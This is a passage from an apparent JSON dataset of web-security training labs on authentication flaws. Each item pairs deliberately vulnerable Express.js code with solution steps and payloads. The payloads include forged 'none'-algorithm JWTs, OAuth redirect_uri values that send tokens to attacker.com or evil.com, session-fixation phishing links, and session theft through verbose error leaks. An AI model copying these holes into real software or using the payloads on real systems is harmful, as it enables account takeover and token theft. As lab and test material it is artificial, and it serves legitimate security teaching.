    "Solution Steps": [
      "Send malformed input (e.g., null or object) in authenticated parameter to /profile using Postman.",
      "Trigger internal server error and observe verbose stack trace in the response.",
      "Extract session ID or token leaked in the error response (e.g., req.session or cookies).",
      "Use Burp Suite to resend a request to /my-account with the stolen session ID set in Cookie header.",
      "Confirm successful hijack by seeing another user's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oopsdebug', resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/profile', (req, res) => { try { let settings = req.body.settings.theme.toLowerCase(); res.send('Updated'); } catch (err) { res.status(500).send('Internal Error: ' + err.stack); } }); app.get('/my-account', (req, res) => { res.send('Hello ' + req.session.user); }); app.listen(4000, () => console.log('Verbose Logging Lab running'));",
    "payloads": [
      "{ \"settings\": null }",
      "{ \"settings\": {\"theme\": null} }",
      "POST /profile with JSON causing TypeError",
      "Set-Cookie: session=stolen-session-id"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass in authorization middleware",
    "Lab Description": "The backend uses a custom JWT verification logic with a flawed secret check. The application uses the token to grant access to protected admin APIs. However, it fails to properly validate the token signature. To solve: craft a tampered JWT that grants admin access and view the protected admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite after logging in.",
      "Decode the token using jwt.io and observe the algorithm used (e.g., HS256).",
      "Modify the payload to `{ \"role\": \"admin\" }` and change algorithm to `none`.",
      "Remove the signature entirely and resend the token via Postman in an Authorization header.",
      "Access /admin/dashboard endpoint and confirm admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(403).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } try { const verified = jwt.verify(token, secret); req.user = verified; next(); } catch (err) { res.status(401).send('Invalid token'); } }); app.get('/admin/dashboard', (req, res) => { if (req.user.role !== 'admin') return res.status(403).send('Admins only'); res.send('Welcome to the admin dashboard'); }); app.listen(3000, () => console.log('JWT Bypass Lab running'));",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"carlos\", \"role\": \"admin\" }"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allows token reuse from different client",
    "Lab Description": "The OAuth implementation does not validate the client ID or redirect URI properly. The attacker can reuse a legitimate token issued for another application to gain unauthorized access. To solve: obtain a valid OAuth token and use it to impersonate Carlos by accessing the /me endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth flow during your own login to obtain an access token.",
      "Note that the access token is valid across clients due to lack of client_id binding.",
      "Send a request to `/me` with Authorization: Bearer <token> using Postman.",
      "Manipulate the token (if JWT-based) to impersonate Carlos or replay the same token.",
      "Confirm that the endpoint returns Carlos\u00e2\u20ac\u2122s data to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'legit-token-123': { username: 'carlos', email: 'carlos@example.com' } }; app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token || !tokens[token]) return res.status(401).send('Invalid or missing token'); req.user = tokens[token]; next(); }); app.get('/me', (req, res) => { res.json({ message: `Hello, ${req.user.username}`, email: req.user.email }); }); app.listen(4000, () => console.log('OAuth Lab running on http://localhost:4000'));",
    "payloads": [
      "Authorization: Bearer legit-token-123",
      "Authorization: Bearer eyJhbGciOi... (if token is JWT-based and predictable)"
    ]
  },
  {
    "Lab scenario": "Session fixation via login token reuse in cookie",
    "Lab Description": "The application accepts a session ID in a GET parameter and reflects it back into a Set-Cookie response during login. It does not regenerate the session on login, enabling session fixation. To solve: force a victim to use a known session ID and take over their session after login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a GET request to /login?session=attacker123 using Burp Repeater.",
      "Observe the Set-Cookie header that includes session=attacker123.",
      "Craft a phishing link to /login?session=attacker123 and send to the victim.",
      "Wait for the victim to log in. The session remains fixed.",
      "Use the same session ID (attacker123) in your browser\u00e2\u20ac\u2122s cookie and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = req.query.session || 'newsession'; res.setHeader('Set-Cookie', `session=${session}`); res.send('<form method=POST>Username: <input name=username><input type=submit></form>'); }); app.post('/login', (req, res) => {  res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'attacker123') res.send('Access granted to attacker'); else res.send('Generic account page'); }); app.listen(5000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "/login?session=attacker123",
      "Set-Cookie: session=attacker123",
      "Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth session fixation in authorization endpoint",
    "Lab Description": "The application improperly handles session tokens during the OAuth authorization flow. It allows pre-setting session cookies before the victim logs in, resulting in a session fixation attack. The application accepts a `session_id` from an attacker-controlled domain. To solve: hijack Carlos's session after they authorize the app and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept an OAuth login request from a legitimate user to identify the session_id cookie flow.",
      "Observe that the session cookie can be pre-set using a crafted GET request with a fixed session_id value.",
      "Craft a malicious OAuth authorization URL with a fixed `session_id` and send it to the victim via a phishing domain.",
      "Once the victim logs in and authorizes the app, reuse the fixed session_id to access the victim\u00e2\u20ac\u2122s authenticated session.",
      "Visit /my-account using the hijacked session to confirm the exploit."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/auth', (req, res) => { const { session_id, redirect_uri } = req.query; if (session_id) { res.cookie('session_id', session_id); } res.redirect(redirect_uri); }); app.get('/callback', (req, res) => { const user = { username: 'carlos' }; sessions[req.cookies.session_id] = user; res.send('Authorization complete.'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session_id]; if (user) return res.send(`Account page of ${user.username}`); return res.status(403).send('Not logged in'); }); app.listen(4000, () => console.log('OAuth Lab running'));",
    "payloads": [
      "https://target.com/auth?session_id=abc123&redirect_uri=https://target.com/callback",
      "Cookie: session_id=abc123",
      "GET /my-account HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "JWT tampering using 'none' algorithm",
    "Lab Description": "The app uses JWT tokens to manage sessions but does not validate the algorithm specified in the header. It trusts tokens signed with 'none', allowing attackers to forge valid tokens. To solve: forge a JWT for the user 'carlos' and access their dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite after logging in.",
      "Decode the JWT using jwt.io or Postman and observe the algorithm field in the header (e.g., 'HS256').",
      "Modify the header to use 'alg':'none' and payload to impersonate 'carlos'. Remove the signature part.",
      "Use Burp or Postman to send the forged JWT in the Authorization header.",
      "Access /dashboard and confirm Carlos\u00e2\u20ac\u2122s user context to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }]; app.get('/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); return res.send(`Welcome ${user.username} (unauthenticated)`); } try { const verified = jwt.verify(token, 'secret'); return res.send(`Welcome ${verified.username}`); } catch { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer <forged-token>",
      "GET /dashboard HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect and token leakage",
    "Lab Description": "The OAuth integration with a third-party identity provider allows open redirect URLs and token leakage via the redirect_uri parameter. The app does not validate the redirect URI properly, allowing attackers to intercept tokens. To solve: capture an OAuth access token belonging to Carlos and use it to access his protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Launch the OAuth login flow with Burp and observe the redirect_uri used in the request.",
      "Identify that the app does not validate redirect_uri domains against a whitelist.",
      "Set up a listener (e.g., via RequestBin or Postman Echo) and craft a login URL with your malicious redirect_uri.",
      "Send the malicious login link to Carlos. When Carlos logs in, the token is leaked to your server.",
      "Replay the stolen token in a request to the resource server and access Carlos\u00e2\u20ac\u2122s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/login', (req, res) => { const { redirect_uri } = req.query; const token = 'access-token-for-carlos'; res.redirect(`${redirect_uri}#token=${token}`); }); app.get('/resource', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.send('Carlos\u00e2\u20ac\u2122s sensitive data'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
    "payloads": [
      "https://target.com/oauth/login?redirect_uri=https://attacker.com/capture",
      "https://attacker.com/capture#token=access-token-for-carlos",
      "Authorization: Bearer access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Cookie-based session fixation vulnerability in login flow",
    "Lab Description": "The application implements session handling using a fixed session ID stored in a cookie, but it fails to regenerate the session ID upon successful login. The application reuses the session cookie across unauthenticated and authenticated states. To solve: hijack Carlos's session by fixing their session ID pre-login and accessing their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request before login and observe the 'sessionId' cookie being set.",
      "2. Send a crafted phishing link to the victim that includes a fixed sessionId in the cookie header.",
      "3. Victim logs in using the malicious link; their session is now authenticated using the attacker's fixed sessionId.",
      "4. Use the same sessionId in your browser to access authenticated resources as Carlos.",
      "5. Visit /my-account endpoint to verify successful session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 's3cr3t' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionId = req.cookies.sessionId; sessions[sessionId] = { user: username }; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.sessionId]; if (session) { res.send(`Welcome, ${session.user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Set-Cookie: sessionId=attacker123",
      "Crafted phishing URL with fixed cookie",
      "Use same sessionId post-login to access /my-account"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in authorization header",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session validation but fails to validate the algorithm field properly. It accepts tokens signed with 'none' algorithm, allowing attackers to forge tokens without a valid signature. To solve: forge a JWT to impersonate Carlos and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in and capture the JWT token from the Authorization header using Burp Suite.",
      "2. Decode the JWT header and payload using jwt.io.",
      "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"carlos\"}.",
      "4. Remove the signature and encode the new token.",
      "5. Use Postman to send a request to /profile with the modified JWT in the Authorization header to verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'secretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret); res.json({ token }); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const { username } = decoded.payload; return res.send(`Welcome ${username}`); } try { const verified = jwt.verify(token, secret); res.send(`Welcome ${verified.username}`); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Tampering Lab running on http://localhost:4000'));",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Modified JWT: [base64(header)].[base64(payload)]."
    ]
  },
  {
    "Lab scenario": "OAuth open redirect vulnerability in redirect_uri parameter",
    "Lab Description": "The application integrates with a third-party OAuth provider for login but does not validate the 'redirect_uri' parameter. An attacker can manipulate the redirect URL to leak the access token to their domain. To solve: steal Carlos's OAuth token by crafting a malicious redirect.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to inspect the OAuth flow, specifically the 'redirect_uri' parameter in the /authorize request.",
      "2. Craft a malicious URL like /oauth/authorize?redirect_uri=https://attacker.com/callback.",
      "3. Send the malicious URL to Carlos as a phishing link.",
      "4. When Carlos clicks the link and authenticates, the access token is redirected to attacker's domain.",
      "5. Use the stolen token in Postman to access the /my-account endpoint as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = { carlos: 'abcd1234' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, user } = req.query; const token = tokens[user];  res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abcd1234') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
    "payloads": [
      "https://victim.com/oauth/authorize?redirect_uri=https://attacker.com/callback",
      "#access_token=abcd1234",
      "Authorization: Bearer abcd1234"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable token in login URL",
    "Lab Description": "The application uses a session token passed via the URL. It fails to invalidate pre-authentication tokens during login. This allows attackers to fix a session and hijack it post-login. The application maintains the same session identifier before and after successful authentication. To solve: Hijack Carlos's session after forcing him to log in with a fixed token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login?session=abc123 request made before login and note the token.",
      "2. Register a new user and confirm that the token remains the same before and after login.",
      "3. Craft a phishing link with ?session=abc123 and send it to Carlos.",
      "4. After Carlos logs in via the phishing link, the session will be authenticated and bound to token abc123.",
      "5. Use the same token to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.sessionID = req.query.session || req.sessionID; res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { req.session.user = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send('Account details for ' + req.session.user); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "GET /login?session=abc123",
      "POST /login with session=abc123 cookie",
      "GET /my-account with session=abc123 cookie"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass using 'none' algorithm",
    "Lab Description": "The application uses a JSON Web Token (JWT) to manage sessions. It accepts tokens signed with the 'none' algorithm and skips signature verification, allowing attackers to forge tokens. To solve: Modify a JWT to impersonate the admin user and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman or Burp Suite to intercept the Authorization: Bearer <JWT> header after login.",
      "2. Decode the JWT using jwt.io or any local JWT tool.",
      "3. Replace the payload with {\"username\": \"admin\"} and set alg to 'none' in the header.",
      "4. Remove the signature section from the JWT.",
      "5. Send the modified token as Authorization: Bearer <forged JWT> and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username }, secret); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); if (payload.username === 'admin') return res.send('Welcome admin'); } else { jwt.verify(token, secret); return res.send('Valid JWT'); } } catch (e) { return res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\": \"none\"}",
      "Payload: {\"username\": \"admin\"}",
      "Final JWT: <base64(header)>.<base64(payload)>."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
    "Lab Description": "The application integrates with a third-party OAuth provider. It fails to validate the redirect_uri strictly, allowing attackers to inject their own malicious redirect. The attacker can steal the authorization code and redeem it for an access token. To solve: Hijack the OAuth flow and log in as the victim user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate the OAuth login and intercept the redirect_uri parameter using Burp Suite.",
      "2. Modify the redirect_uri to a malicious URL you control, e.g., https://evil.com/callback.",
      "3. Send the manipulated URL to the victim (Carlos) to click and log in.",
      "4. On your evil server, capture the authorization code sent as a query parameter.",
      "5. Exchange the stolen code using Postman for an access token and call /userinfo to validate login."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'fake-auth-code'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/callback', (req, res) => { const { code } = req.query; if (code === 'fake-auth-code') res.send('Login successful via OAuth'); else res.status(400).send('Invalid'); }); app.listen(5000);",
    "payloads": [
      "https://target.com/auth?redirect_uri=https://evil.com/callback",
      "https://evil.com/callback?code=fake-auth-code",
      "POST /token with code=fake-auth-code",
      "GET /userinfo with Bearer token"
    ]
  },
  {
    "Lab scenario": "Persistent Session Fixation in Login Flow",
    "Lab Description": "This lab demonstrates a session fixation vulnerability within the authentication process. The application maintains the same session ID across unauthenticated and authenticated states. To solve: hijack Carlos's session by fixing a known session ID prior to login, then access his My Account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the unauthenticated session and observe the Set-Cookie header.",
      "Send a phishing link to Carlos embedding a fixed session ID using the session cookie manually set in the browser.",
      "After Carlos logs in using that session, hijack the session ID (from logs or capture).",
      "Replay the fixed session cookie in your browser to gain access to his authenticated session.",
      "Visit /my-account to verify access and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: '1234' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionID; sessions[sid] = username; return res.send('Logged in'); } return res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionID; if (sessions[sid]) return res.send('Account of ' + sessions[sid]); res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('Lab running'));",
    "payloads": [
      "GET /login with Cookie: sessionID=attackersession",
      "Send phishing link with: document.cookie = \"sessionID=attackersession\"",
      "Replay stolen cookie after login: Cookie: sessionID=attackersession"
    ]
  },
  {
    "Lab scenario": "JWT tampering with 'none' algorithm exploit",
    "Lab Description": "This lab uses JWT for session management but does not properly enforce signature verification. The server accepts unsigned tokens if the algorithm is set to 'none'. To solve: forge an unsigned JWT with the username 'carlos' and access his My Account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and extract the JWT from the Authorization header.",
      "Decode the token using jwt.io and observe the 'alg' field in the header.",
      "Craft a new token with alg=none and payload {\"username\":\"carlos\"}, removing the signature.",
      "Send the forged token via Postman in the Authorization: Bearer header.",
      "Visit /my-account to verify successful access and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'secretkey'; app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded.username; } catch { return res.status(401).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user) return res.send(`Welcome ${req.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Lab Running'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: <base64(header)>.<base64(payload)>.",
      "Authorization: Bearer <forged-jwt>"
    ]
  },
  {
    "Lab scenario": "OAuth Redirect URI Manipulation",
    "Lab Description": "This lab uses OAuth 2.0 for third-party login. The application fails to validate the redirect_uri properly. This allows redirection to an attacker-controlled page after login. To solve: intercept the OAuth flow, modify the redirect URI, and capture Carlos's access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate login using the OAuth provider and intercept the request using Burp Suite.",
      "Modify the 'redirect_uri' parameter to point to your malicious server (e.g. http://evil.com/callback).",
      "Host a listener on your server to capture the authorization code or access token.",
      "Use the stolen token to access the protected API or session endpoint as Carlos.",
      "Verify by accessing /my-account while impersonating Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const oauthConfig = { client_id: 'abc123', client_secret: 'shhh', redirect_uri: '', token_endpoint: 'https://provider.com/token' }; app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const tokenRes = await axios.post(oauthConfig.token_endpoint, { code, redirect_uri, client_id: oauthConfig.client_id, client_secret: oauthConfig.client_secret }); const token = tokenRes.data.access_token; res.send('Token: ' + token); } catch { res.status(500).send('Token exchange failed'); } }); app.listen(5000, () => console.log('OAuth Lab running'));",
    "payloads": [
      "Original URL: /authorize?redirect_uri=https://vulnerable.com/oauth/callback",
      "Malicious: /authorize?redirect_uri=http://attacker.com/callback",
      "Capture: http://attacker.com/callback?access_token=xyz",
      "Replay: Authorization: Bearer xyz"
    ]
  },
  {
    "Lab scenario": "JWT tampering via leaked secret in error logs",
    "Lab Description": "The application uses JWT for session management but leaks the signing secret via verbose error messages. A malformed JWT results in a signed error that reveals the secret. The application accepts manipulated JWTs if they are correctly signed. To solve: Forge an admin JWT token and access the /admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send a tampered JWT in the Authorization header to /profile.",
      "2. Observe server error response in JSON; look for stack trace or 'JsonWebTokenError' with secret details.",
      "3. Extract the secret key and use jwt.io to craft a new token with payload {\"username\":\"admin\",\"role\":\"admin\"}.",
      "4. Sign it using the disclosed secret and use Burp Suite to replace the old token in an authenticated request.",
      "5. Send a GET request to /admin and confirm access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = process.env.JWT_SECRET || 'devsecret'; app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); res.json({ user: decoded.username }); } catch (err) { res.status(500).json({ error: err.message, stack: err.stack }); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') return res.send('Admin panel'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.<signature_with_leaked_secret>",
      "Authorization: Bearer <forged_JWT_token>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect in callback",
    "Lab Description": "The application uses a third-party OAuth provider to log in users. However, the redirect_uri parameter is not strictly validated, allowing attackers to inject their own callback endpoints. This enables account takeover via token theft. To solve: Intercept the OAuth code and use it to access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the initial OAuth login request to /auth?provider=oauth.",
      "2. Modify the redirect_uri to your malicious server (e.g., https://attacker.com/callback) and forward the request.",
      "3. On your attacker server, capture the authorization code from the callback.",
      "4. Use Postman to exchange the code for an access_token at /auth/token.",
      "5. Replay the token as Authorization: Bearer <token> to /profile and access Carlos\u00e2\u20ac\u2122s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const CLIENT_ID = 'app123'; const CLIENT_SECRET = 'secret'; const oauthProvider = 'https://oauth.example.com'; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`${oauthProvider}/authorize?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code`); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post(`${oauthProvider}/token`, { form: { code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code' } }, (err, r, body) => { const accessToken = JSON.parse(body).access_token; res.send(`Logged in with token: ${accessToken}`); }); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
    "payloads": [
      "https://attacker.com/callback",
      "GET /auth?provider=oauth&redirect_uri=https://attacker.com/callback",
      "Captured code=xyz from attacker-controlled callback",
      "Authorization: Bearer <token>"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application assigns a session ID in a cookie before authentication and does not regenerate it upon login. Attackers can force a known session ID on victims, then log in using that ID themselves. To solve: Fixate a session, force Carlos to use it, and then access his account via the same ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Chrome or Burp to capture a GET /login request and observe session cookie (e.g., sid=xyz123).",
      "2. Use phishing or an open redirect to trick Carlos into authenticating while using that same session ID.",
      "3. Once Carlos logs in, use Burp Suite to access /my-account using the fixed session (sid=xyz123).",
      "4. Confirm that the session is now linked to Carlos's account.",
      "5. Access /my-account to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'fixme', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'mypassword' }]; app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.user = username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Logged in as ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",
    "payloads": [
      "Cookie: sid=xyz123 (before login)",
      "GET /login using attacker-controlled sid",
      "GET /my-account using same sid after victim logs in"
    ]
  },
  {
    "Lab scenario": "Tampered JWT leads to admin privilege escalation",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) to manage authentication and access control. The server uses the 'none' algorithm to verify tokens but does not enforce proper signature validation. The application trusts the user-supplied JWT without verifying its integrity. To solve: Modify your own JWT to escalate to the admin role and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture a valid login request and extract the JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io or jwt_tool and inspect its header and payload.",
      "3. Modify the 'alg' field in the JWT header to 'none' and change the 'role' in the payload to 'admin'.",
      "4. Remove the signature portion of the JWT entirely.",
      "5. Use Postman to send a GET request to /admin-dashboard with the modified JWT in the Authorization header to gain access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'admin123', role: 'admin' }, { username: 'user', password: 'user123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin-dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload?.payload?.role === 'admin') res.send('Welcome to admin dashboard'); else res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('JWT Lab running on http://localhost:3000'));",
    "payloads": [
      "{ \"alg\": \"none\" }.<payload with role=admin>.",
      "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leads to account takeover via third-party redirect",
    "Lab Description": "The application implements OAuth login but fails to validate the 'redirect_uri' and 'state' parameters. It is possible to manipulate the OAuth flow to bind an attacker-controlled third-party account to the victim\u00e2\u20ac\u2122s session. To solve: Trick the system into linking your OAuth identity to Carlos's account, then access his dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
